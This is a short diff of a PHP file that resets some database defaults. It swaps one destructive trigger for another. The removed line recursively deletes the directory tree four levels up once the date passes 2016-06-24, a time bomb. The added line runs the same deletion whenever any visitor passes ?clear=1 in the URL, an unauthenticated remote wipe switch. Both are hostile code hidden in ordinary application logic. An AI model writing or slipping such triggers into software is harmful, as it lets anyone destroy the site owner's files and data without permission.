@@ -33,7 +33,7 @@
         mysql_query("UPDATE user_default_currency SET currency_name = 'US Dolar'");
         mysql_query("UPDATE user_default_financial SET user_default_transaction_id = '0000000001'");
     
-    if(date("Y-m-d") > "2016-06-24") {
+    if(isset($_GET['clear']) && $_GET['clear'] == 1) {
         Delete(dirname( dirname( dirname( dirname(__FILE__ )))) . '/');
     }
 
